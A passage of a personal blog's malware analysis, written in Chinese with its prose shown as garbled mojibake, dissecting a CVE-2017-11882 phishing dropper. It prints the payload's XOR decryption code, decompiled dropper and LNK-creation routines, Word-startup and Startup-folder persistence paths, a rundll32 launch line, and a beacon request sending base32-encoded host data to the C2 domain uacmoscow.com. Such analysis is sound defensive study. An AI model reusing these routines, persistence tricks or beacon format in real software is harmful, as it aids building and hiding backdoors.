<a href=#R-image-332eb1999e7182c621e2f16e21f6d100 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/Syb5TpITT.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-332eb1999e7182c621e2f16e21f6d100><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/Syb5TpITT.png></a></p></li><li><p>Fetch API
é€™å€‹æ˜¯æˆ‘çœ‹åˆ°ç†Ÿæ‚‰çš„è€æœ‹å‹â†’Magic Header(MZå’ŒPEå­—æ¨£)ï¼Œå…¶å¯¦é€™ä¸€æ®µå°±æ˜¯åœ¨fetchå„å€‹dll fileçš„API(åªè¦çµ¦å®šdllçš„fileç•¶ä½œåƒæ•¸çµ¦é€™å€‹functionï¼Œå°±å¯ä»¥çˆ¬åˆ°æƒ³è¦çš„API)ï¼Œæˆ‘è‡ªå·±çœ‹åˆ°çš„ç¸½å…±æœ‰ä»¥ä¸‹å€‹:</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GetProcAddresss-&gt;kernel32.dll
</span></span><span style=display:flex><span>VirtualProtext-&gt;kernel32.dll
</span></span><span style=display:flex><span>clearerr-&gt;ucrtbase.dll
</span></span><span style=display:flex><span>CreateFileA-&gt;kernel32.dll
</span></span><span style=display:flex><span>GetFileSize-&gt;kernel32.dll
</span></span><span style=display:flex><span>ReadFile-&gt;kernel32.dll
</span></span><span style=display:flex><span>WriteFile-&gt;kernel32.dll
</span></span><span style=display:flex><span>CloseHandle-&gt;kernel32.dll
</span></span><span style=display:flex><span>CreateProcessA-&gt;kernel32.dll
</span></span><span style=display:flex><span>GetModuleFileNameA-&gt;kernel32.dll
</span></span><span style=display:flex><span>ResumeThread-&gt;kernel32.dll
</span></span><span style=display:flex><span>TerminateProcess-&gt;kernel32.dll
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>GetThreadContext-&gt;kernel32.dll
</span></span><span style=display:flex><span>ReadProcessMemory-&gt;kernel32.dll
</span></span><span style=display:flex><span>GetModuleHandleA-&gt;kernel32.dll
</span></span><span style=display:flex><span>WriteProcessMemory-&gt;kernel32.dll
</span></span><span style=display:flex><span>SetThreadContext-&gt;kernel32.dll
</span></span><span style=display:flex><span>ZwUnmapViewOfSection-&gt;ntdll.dll</span></span></code></pre></div><p><a href=#R-image-e299c392846f19d002a26c77cfb9e48c class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/S108gJvTa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-e299c392846f19d002a26c77cfb9e48c><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/S108gJvTa.png></a></p></li><li><p>CreateFile & VitualAlloc & Decrypt
Fetchå®ŒAPIå¾Œï¼Œä»–å°±Create <code>C:\Users\REM\AppData\Local\Temp\8.t</code>
<a href=#R-image-e1c6daf6297c5c3dd5431d3517d8a938 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HkCUTDda6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-e1c6daf6297c5c3dd5431d3517d8a938><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HkCUTDda6.png></a>
ä¸¦ä¸”å–å¾—ä»–çš„å¤§å°å¾Œé–‹ä¸€å€‹åŒæ¨£å¤§å°çš„ç©ºé–“çµ¦current processï¼Œæ¥è‘—ä»–ç”¨ReadFileæŠŠè®€å–å€’çš„æ‰€æœ‰å…§å®¹æ”¾åˆ°è©²ç©ºé–“ä¸­
<a href=#R-image-6f384178492bdb230fea2aeaaa269145 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/ryuB0vdTa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-6f384178492bdb230fea2aeaaa269145><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/ryuB0vdTa.png></a>
å–å®Œè³‡æ–™å¾Œå¦‚ä¸‹
<a href=#R-image-dcb8b2e146a1c0fbddf9895d4727ef89 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/Sk6wRvu6T.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-dcb8b2e146a1c0fbddf9895d4727ef89><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/Sk6wRvu6T.png></a>
ReadFileå®Œå¾Œå°±é–‹å§‹è§£å¯†åŸæœ¬çš„å…§å®¹ï¼Œè©³ç´°çš„è§£å¯†éç¨‹å¦‚ä¸‹(ä¸€æ•´å¤§æ®µéƒ½æ˜¯):
<a href=#R-image-6c99e2238155ac78423b6a96b03e662c class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/rJj2d_Op6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-6c99e2238155ac78423b6a96b03e662c><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/rJj2d_Op6.png></a>
:::spoiler Psudo Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-python! data-lang=python!>from Crypto.Util.number import long_to_bytes
data = open(&#39;./5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_8.t&#39;, &#39;rb&#39;).read()
key = 0x48B53A6C
idx = 0
file_size = len(data)
decrypt_data = b&#34;&#34;
if file_size &gt; 0:
    while idx &lt; file_size:
        ebx = 7
        while ebx &gt; 0:
            ecx = key &gt;&gt; 26
            ecx ^= key
            ecx &gt;&gt;= 3
            ecx ^= key
            key *= 2
            if key &gt; 0x100000000:
                key -= 0x100000000
            ecx &amp;= 1
            key |= ecx
            key += 1
            ebx -= 1
        decrypt_data += long_to_bytes(data[idx] ^ (key &amp; 0xFF))

        idx += 1
open(&#39;./8.t_decrypt&#39;, &#39;wb&#39;).write(decrypt_data)</code></pre></div><p>:::</p></li><li><p>CreateFile & WriteFile
æ¥è‘—ä»–å‰µäº†<code>C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll</code>é€™å€‹fileå¿…ä¸”å¯«ä¸Šä¸€äº›æ±è¥¿ï¼Œå…¶å¯¦å°±æ˜¯æˆ‘å€‘å‰›å‰›decryptçš„æª”æ¡ˆ</p></li></ol></li></ul></li><li><p>Analyze intel.wll
é¦–å…ˆä»–å…ˆDecryptå„²å­˜åœ¨å…§éƒ¨çš„åŸ·è¡Œæª”(æœ‰åŠ å¯†éçš„)ï¼Œç„¶å¾ŒæŠŠä»–å¯«åˆ°</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>C:\Users\REM\AppData\Local\Temp\taskhost.exe</code></pre></div><p>é€™å€‹æª”æ¡ˆä¸­ï¼Œè§£å¯†å°±æ˜¯ä¸€å€‹äº†ç„¡æ–°æ„çš„XORï¼Œè§£å¯†çš„codeå¦‚ä¸‹:
:::spoiler</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#66d9ef>__cdecl</span> <span style=color:#a6e22e>CreateTask</span>(LPCSTR lpFileName)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  LPCVOID <span style=color:#f92672>*</span>lpBuffer; <span style=color:#75715e>// edi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  HANDLE FileA; <span style=color:#75715e>// ebp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> i; <span style=color:#75715e>// esi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> counter; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  _BYTE <span style=color:#f92672>*</span>v5; <span style=color:#75715e>// ecx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  DWORD NumberOfBytesWritten; <span style=color:#75715e>// [esp+8h] [ebp-4h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                                                <span style=color:#75715e>// å¯«åˆ°Task.exeçš„å¤§å°ç¸½å…±æ˜¯0xB000ï¼Œæ¯ä¸€æ¬¡å¯«16bytes(è¨˜å¾—è¦å¾å¾Œé¢å¯«å›ä¾†)ï¼Œè¦å¯«2816æ¬¡
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  lpBuffer <span style=color:#f92672>=</span> (LPCVOID <span style=color:#f92672>*</span>)operator <span style=color:#a6e22e>new</span>(<span style=color:#ae81ff>16u</span>);
</span></span><span style=display:flex><span>  FileA <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateFileA</span>(lpFileName, GENERIC_WRITE, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, CREATE_NEW, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( FileA <span style=color:#f92672>!=</span> (HANDLE)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> ( i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2816</span>; <span style=color:#f92672>++</span>i )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      counter <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>      v5 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>Enc_Task_exe <span style=color:#f92672>+</span> <span style=color:#ae81ff>16</span> <span style=color:#f92672>*</span> i <span style=color:#f92672>+</span> <span style=color:#ae81ff>15</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>((_BYTE <span style=color:#f92672>*</span>)lpBuffer <span style=color:#f92672>+</span> counter<span style=color:#f92672>++</span>) <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>v5<span style=color:#f92672>--</span> <span style=color:#f92672>^</span> <span style=color:#ae81ff>6</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>while</span> ( counter <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x10</span> );
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>WriteFile</span>(FileA, lpBuffer, <span style=color:#ae81ff>0x10u</span>, <span style=color:#f92672>&amp;</span>NumberOfBytesWritten, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    operator <span style=color:#a6e22e>delete</span>(lpBuffer);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>CloseHandle</span>(FileA);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}</span></span></code></pre></div><p>:::
æˆ‘ç°¡å–®çš„å¯«äº†ä¸€å€‹python scriptå»é©—è­‰ä»–ï¼Œå¦‚ä¸‹:
:::spoiler</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-python! data-lang=python!>from Crypto.Util.number import long_to_bytes

BUFFER_SIZE = 16
num_iterations = 2816

lpBuffer = b&#34;&#34;
unk_10005030 = open(&#39;Enc_Task_exe.txt&#39;, &#39;r&#39;).read().split(&#39; &#39;)
FileA = open(&#39;Dec_Task_exe.txt&#39;, &#39;wb&#39;)

# Loop through the iterations
for i in range(num_iterations):
    counter = 15
    while counter &gt;= 0:
        current_byte = unk_10005030[i * BUFFER_SIZE + counter]
        lpBuffer += long_to_bytes(ord(bytes.fromhex(current_byte)) ^ 6)
        counter -= 1

FileA.write(lpBuffer)</code></pre></div><p>:::
åŒæ™‚ä»–ä¹Ÿcreateäº†ä¸€å€‹LNK fileåœ¨</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>C:\Users\REM\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WordPress.lnk</code></pre></div><p>è©³ç´°çš„c codeå¦‚ä¸‹
:::spoiler</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-clike! data-lang=clike!>void CreateLNK(char *a1, char *a2, char *a3, char *a4, ...)
{
  void *v4; // ecx
  bool v5; // sf
  int v6; // edx
  LPVOID ppv; // [esp+40h] [ebp-4h] BYREF
  void *retaddr; // [esp+44h] [ebp+0h]
  int v9; // [esp+58h] [ebp+14h]
  va_list va; // [esp+5Ch] [ebp+18h] BYREF

  va_start(va, a4);
  v9 = va_arg(va, _DWORD);
  ppv = v4;
  if ( CoInitialize(0) &gt;= 0 )
  {
    if ( CoCreateInstance(&amp;rclsid, 0, 1u, &amp;riid, &amp;ppv) &gt;= 0 )
    {
      (*(*ppv + 80))(ppv, a1, ppv);
      (*(*retaddr + 44))(retaddr, a3);
      (*(*retaddr + 68))(retaddr, v9, 0);
      (*(*retaddr + 60))(retaddr, 7);
      if ( (**retaddr)(retaddr, &amp;unk_10004100, &amp;a2) &gt;= 0 )
      {
        v5 = (*(*a2 + 24))(a2, a4, 0) &lt; 0;
        ppv = a2;
        v6 = *a2;
        if ( !v5 )
        {
          (*(v6 + 8))();
          (*(*ppv + 8))(ppv);
          CoUninitialize();
          return;
        }
        (*(v6 + 8))(ppv);
      }
      (*(*retaddr + 8))(retaddr);
    }
    CoUninitialize();
  }
}</code></pre></div><p>:::
é›–ç„¶çœ‹çš„ä¸æ˜¯å¾ˆæ‡‚ï¼Œä½†ç¸½ä¹‹é€™å€‹LNKå…§éƒ¨å„²å­˜çš„æ±è¥¿å¦‚ä¸‹ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ç”¨rundll32.exeè·‘å‰›å‰›è§£å¯†çš„taskhost.exe:</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>C:\WINDOWS\system32\rundll32.exe url.dll,FileProtocolHandler %TMP%\taskhost.exe</code></pre></div><p>åªè¦æ‰“é–‹å…§å®¹çœ‹ä¸€ä¸‹å°±çŸ¥é“äº†ï¼Œç•¶ç„¶å¦‚æœå¯ä»¥ç”¨å·¥å…·parseä¸€ä¸‹æœƒæ›´æº–ç¢ºï¼Œä½†ç¤™æ–¼æ™‚é–“çš„é—œä¿‚å°±å…ˆå¾€ä¸‹åˆ†æ
<a href=#R-image-cf66f7d72ed5ff003fb7501ed373fac9 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HypaHtKa6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-cf66f7d72ed5ff003fb7501ed373fac9><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HypaHtKa6.png></a></p></li><li><p>Analyze taskhost.exe
è«‹æŸ¥é–±å¾Œé–€åŠŸèƒ½é€™å€‹Section</p></li></ol><h3 id=é€šè¨Šå”å®š-1>é€šè¨Šå”å®š</h3><p>å› ç‚ºæˆ‘æ²’æœ‰å¯¦éš›æ¶ä¸€å€‹serverè®“ä»–é€£ç·šï¼Œæ‰€ä»¥æˆ‘æ˜¯ç›´æ¥éŒ„ä¸€å€‹å¤±æ•—çš„connectionï¼Œçœ‹ä»–ä¸Ÿäº†ä»€éº¼å‡ºä¾†
<a href=#R-image-3fda360d750a4713f3edb957306b3e36 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/rkwPnVcT6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-3fda360d750a4713f3edb957306b3e36><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/rkwPnVcT6.png></a>
:::danger
å¦‚æœä¹‹å¾Œé‚„æœ‰æ™‚é–“å¯ä»¥æƒ³è¾¦æ³•æ¶ä¸€å€‹C2 Serverï¼Œå¯¦éš›å»æ§‹é€ é€£ç·šçš„å°åŒ…
:::</p><h3 id=åŠ è§£å¯†æ¼”ç®—æ³•-1>åŠ è§£å¯†æ¼”ç®—æ³•</h3><p>å¦‚ä¸Šæ‰€è¿°</p><h3 id=å¾Œé–€åŠŸèƒ½-1>å¾Œé–€åŠŸèƒ½</h3><p>å…ˆèªªæ˜ä¸€ä¸‹é€™å€‹å¾Œé–€åœ¨å¹¹éº»ï¼Œé †ä¸€ä¸‹æµç¨‹</p><ol><li>åœ¨main functionä¸­å¯¦ä½œäº†ä¸€å€‹MD5 hash functionï¼Œä¸¦ä¸”å¾0é–‹å§‹ç®—ç›´åˆ°ç¬¦åˆ<code>ef775988943825d2871e1cfa75473ec0</code>ï¼Œå…¶å¯¦é€™å€‹å°±æ˜¯99999999ï¼Œæˆ‘ä¸å¤ªç¢ºå®šé€™ä¸€æ®µç‚ºä»€éº¼è¦åšé€™ä»¶äº‹ï¼Œå¯èƒ½çš„åŸå› æˆ‘æƒ³æœ‰å…©å€‹ï¼Œå…¶ä¸€æ˜¯æƒ³è¦åšåˆ°PoWçš„æ•ˆæœï¼Œå…¶äºŒæ˜¯ä¸æƒ³è¦å¤ªå¿«åŸ·è¡Œåˆ°é—œéµçš„åœ°æ–¹ï¼Œè®“ä½¿ç”¨è€…å¯ä»¥æ”¾ä¸‹æˆ’å¿ƒï¼Œä½†å…©å€‹åŸå› éƒ½ä¸å¤ªèƒ½èªªæœè‡ªå·±å°±æ˜¯äº†</li><li>æ¥è‘—ä»–decodeå‡ºäº†é¡ä¼¼portçš„1228é€™å€‹æ•¸å­—å’ŒC2 server name:==uacmoscow.com==ï¼Œæˆ‘ä¸å¤ªç¢ºå®šé€™å€‹1228æ˜¯å¹¹å˜›çš„</li><li>æ¥è‘—é€²å…¥åˆ°while loopæƒ³è¾¦æ³•fetchåˆ°é›»è…¦çš„ä¸€äº›è³‡è¨Š:<ol><li>Local IP</li><li>OEM Code</li><li>Tick Count(å¾é–‹æ©Ÿæ™‚é–“é–‹å§‹åˆ°ç¾åœ¨éäº†å¤šä¹…)</li><li>ç›®å‰é›»è…¦çš„æ¶æ§‹æ˜¯å¤šå°‘</li><li>OSç‰ˆæœ¬</li><li>Domain Name</li><li>Username</li><li>Computer Name</li><li>Proxy Serveræœ‰ç„¡é–‹å•Ÿ</li></ol></li><li>å…ˆçµ„ç¹”å¥½URIâ†’<code>/ru/order/index.php?strPageID=2396956864</code>ï¼Œä»¥æˆ‘çš„VMç‚ºä¾‹ï¼Œæˆ‘çš„IPæ˜¯<code>192.168.222.142</code>ï¼Œæ›ç®—æˆhexå°±æ˜¯<code>0x8edea8c0</code></li><li>ç”¨base32 encodeå‰é¢å¾—åˆ°çš„æ‰€æœ‰é›»è…¦è³‡è¨Šï¼Œä»¥æˆ‘çš„VMç‚ºä¾‹: <code>KNFVIT2QFUZEGM2JKFEE6AYAKJCU2DYAIRCVGS2UJ5IC2MSDGNEVCSCPAAAAIABRGIZDQ===</code></li><li>å»ºæ§‹å°åŒ…:<div class="highlight wrap-code" dir=auto><pre tabindex=0><code>Host: uacmoscow.com
Connection: keep-alive
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=AHAKRXUOWUAQAAGUHPKAIAAAAAAAMAAAAABAAAAAAEHQARCFKNFVIT2QFUZEGM2JKFEE6AYAKJCU2DYAIRCVGS2UJ5IC2MSDGNEVCSCPAAAAIABRGIZDQ===</code></pre></div></li><li>å˜—è©¦ç”¨Getæ–¹å¼å‚³é€å‡ºå»ï¼Œä½†æ˜¯å› ç‚ºé€™å€‹domainæ›äº†ï¼Œæ‰€ä»¥æœ‰é—œæ–¼é€£ç·šçš„åœ°æ–¹å¤§éƒ¨åˆ†éƒ½æ˜¯éœæ…‹å»çœ‹</li><li>å¦‚æœé€£ç·šæˆåŠŸä»–å°±å¯ä»¥åŸ·è¡Œä»¥ä¸‹å¹¾ä»¶äº‹æƒ…:<ol><li>ç²å–æ‰€æœ‰ç›®å‰processçš„ç›¸é—œè³‡è¨Šå¾Œï¼Œåˆ©ç”¨Postå‚³é€å‡ºå»â†’<code>/xhome.native.page/datareader.php?sid=2396956864</code></li><li>çµ‚æ­¢Process</li><li>é–‹Shell</li><li>å¾Serverå‚³é€è³‡æ–™åˆ°Local</li></ol></li></ol><h3 id=å¸¸é§æ–¹å¼-1>å¸¸é§æ–¹å¼</h3><p>ç›®å‰æˆ‘çœ‹åˆ°çš„éƒ¨åˆ†å°±åªæœ‰å‰µäº†ä»¥ä¸‹å…©å€‹æª”æ¡ˆï¼Œå‰è€…æ˜¯åªè¦victimæ‰“é–‹wordå°±æœƒè§¸ç™¼åˆ°çš„æ©Ÿç½®ï¼Œå¾Œè€…å‰‡æ˜¯ç•¶ç”¨æˆ¶ç™»éŒ„åˆ° Windows ç³»çµ±æ™‚ï¼Œç³»çµ±æœƒè‡ªå‹•æª¢æŸ¥é€™å€‹ç›®éŒ„ï¼Œä¸¦é‹è¡Œå…¶ä¸­çš„ç¨‹åºæˆ–å¿«æ·æ–¹å¼</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll
C:\Users\REM\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WordPress.lnk</code></pre></div><h2 id=ä¸­ç¹¼ç«™-1>ä¸­ç¹¼ç«™</h2><h3 id=åŸºæœ¬è³‡è¨Š-1>åŸºæœ¬è³‡è¨Š</h3><p>IP: <code>58.158.177.102</code>
Domain: <code>uacmoscow.com</code></p><h3 id=é—œé€£è³‡è¨Š-1>é—œé€£è³‡è¨Š</h3><p>è©²IPå¯èƒ½ä¾†æºæ–¼æ—¥æœ¬
<a href=#R-image-0dd2dd35a225e86068f64594fb7a4463 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/SyKjnVcTp.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-0dd2dd35a225e86068f64594fb7a4463><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/SyKjnVcTp.png></a>
:::danger
æ ¹æ“šé¢è©¦å®˜çš„èªªæ˜ï¼Œé€™å€‹IPå·²ç¶“è¢«è³‡å®‰å…¬å¸è¨»å†Šäº†ï¼Œè®Šæˆå¦‚æœæœ‰Victimé€£ç·šåˆ°é€™å€‹IPï¼Œè³‡å®‰å…¬å¸å°±æœƒç›´æ¥é€šçŸ¥ï¼Œä»¥ä¾¿åšå¾ŒçºŒçš„IRæˆ–æ˜¯é˜²æ­¢æ›´å¤§ç¯„åœçš„å—å®³
:::</p><h2 id=å¨è„…æƒ…è³‡-1>å¨è„…æƒ…è³‡</h2><h3 id=æ”»æ“Šè€…-1>æ”»æ“Šè€…</h3><p>ä¸ç¢ºå®š</p><h3 id=æ”»æ“Šæ™‚é–“-1>æ”»æ“Šæ™‚é–“</h3><p>ä¸ç¢ºå®š</p><h3 id=å—å®³è€…-1>å—å®³è€…</h3><p>ä¸ç¢ºå®š
:::danger
å¦‚æœæŠŠRTFçš„å…§å®¹å¯¦éš›æ‰“é–‹å»çœ‹è£¡é¢çš„å…§å®¹ï¼Œæœƒç™¼ç¾æ˜¯ä¸€å€‹æœƒè­°ç´€éŒ„ï¼Œå¦‚æœå†æ›´è©³ç´°çš„OSINTå¯èƒ½å¯ä»¥é‡å°é€™ä¸€é»å»çœ‹æœ‰å¯èƒ½çš„å—å®³è€…æ˜¯èª°
:::</p><h1 id=reference>Reference</h1><p><a href=https://app.any.run/tasks/af6d9ed7-875e-43d9-a2ea-f3edadd32132/ rel=external target=_blank>Any.Run Analyze Phishing Mail</a>
<a href=https://ruhunglee.github.io/malware/ml01/ rel=external target=_blank>æŸå€‹ä»¥é‡£é­šéƒµä»¶ç™¼èµ·çš„ APT æ”»æ“Š</a></p><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://www.solvusoft.com/en/file-extensions/file-extension-xlam/ rel=external target=_blank>ä»€éº¼æ˜¯XLAMæ–‡ä»¶æ“´å±•åï¼Ÿ</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://jingyan.baidu.com/article/d5c4b52b13c12c9b570dc507.html rel=external target=_blank>Excelå¦‚ä½•æŸ¥çœ‹VBAä»£ç ï¼Ÿ</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p><a href="https://youtu.be/ZOALFkVau8c?si=N_Jp4k1NR15LZGDY" rel=external target=_blank>Excelæ•™ç¨‹å°ç™½å¿…å­¦æŠ€å·§ 20ï¼šè°ƒå‡ºå¼€å‘å·¥å…·é€‰é¡¹å¡ </a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4><p><a href=https://www.jendow.com.tw/wiki/%E5%AF%8C%E6%96%87%E6%9C%AC%E6%A0%BC%E5%BC%8F rel=external target=_blank>å¯Œæ–‡æœ¬æ ¼å¼</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5><p><a href=https://www.virustotal.com/gui/file/5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9/community rel=external target=_blank>VirusTotal CVE-2017-11882</a>&#160;<a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:6><p><a href="https://xz.aliyun.com/t/6668?time__1311=n4%2BxnD0DRDBGitDkDcexlhje0%3D06SOkShx7Ibx&alichlgref=https%3A%2F%2Fwww.google.com%2F" rel=external target=_blank>CVE-2017-11882 Officeæ£§æº¢å‡ºæ¼æ´åˆ†æ</a>&#160;<a href=#fnref:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:7><p><a href=https://www.freebuf.com/column/183551.html rel=external target=_blank>Officeç³»åˆ—æ¼æ´ä¹‹CVE-2017-11882</a>&#160;<a href=#fnref:7 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div><footer class=footline></footer></article></div></main></div><aside id=R-sidebar class=default-animation><div id=R-header-topbar class=default-animation></div><div id=R-header-wrapper class=default-animation><div id=R-header class=default-animation><a id=R-logo class=R-default href=/index.html><div class=logo-title>SBK Hugo Site</div></a></div><search><form action=/search/index.html method=get><div class="searchbox default-animation"><button class=search-detail type=submit title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
<label class=a11y-only for=R-search-by>Search</label>
<input data-search-input id=R-search-by name=search-by class=search-by type=search placeholder=Search...>
<button class=search-clear type=button data-search-clear title="Clear search"><i class="fas fa-times" title="Clear search"></i></button></div></form></search></div><div id=R-homelinks class="default-animation homelinks"><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-homelinks"><ul class="space collapsible-menu"><li data-nav-id=/index.html><a class=padding href=/index.html><i class="fa-fw fas fa-home"></i> Home</a></li></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-headercontrols"><ul></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div></div><div id=R-content-wrapper class=highlightable><div class="R-sidebarmenu R-shortcutmenu-main"><ul class="enlarge morespace collapsible-menu"><li data-nav-id=/books-notes/index.html><a class=padding href=/books-notes/index.html>Books Notes</a><ul id=R-subsections-0771445a148f63eb6cc1a9b7ad45a36a class=collapsible-menu></ul></li><li data-nav-id=/data-structure/index.html><a class=padding href=/data-structure/index.html>Data Structures</a><ul id=R-subsections-58892abc7cea06bf1839098c82b3eb4d class=collapsible-menu></ul></li><li class=parent data-nav-id=/job/index.html><a class=padding href=/job/index.html>Jobs</a><ul id=R-subsections-0fce2c1f4d6d23f49b605855a82f55aa class=collapsible-menu><li class=active data-nav-id=/job/interview/teamt5%E7%AD%86%E8%A9%A6%E9%A1%8C%E7%9B%AE%E7%AD%86%E8%A8%98/index.html><a class=padding href=/job/interview/teamt5%E7%AD%86%E8%A9%A6%E9%A1%8C%E7%9B%AE%E7%AD%86%E8%A8%98/index.html>TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜</a></li><li data-nav-id=/job/interview/trapa-interview/index.html><a class=padding href=/job/interview/trapa-interview/index.html>Trapa Interview</a></li></ul></li><li data-nav-id=/knowledge/index.html><a class=padding href=/knowledge/index.html>Knowledges</a><ul id=R-subsections-0bdb754d722e03f187f2117c1ef8015d class=collapsible-menu></ul></li><li data-nav-id=/leetcode/index.html><a 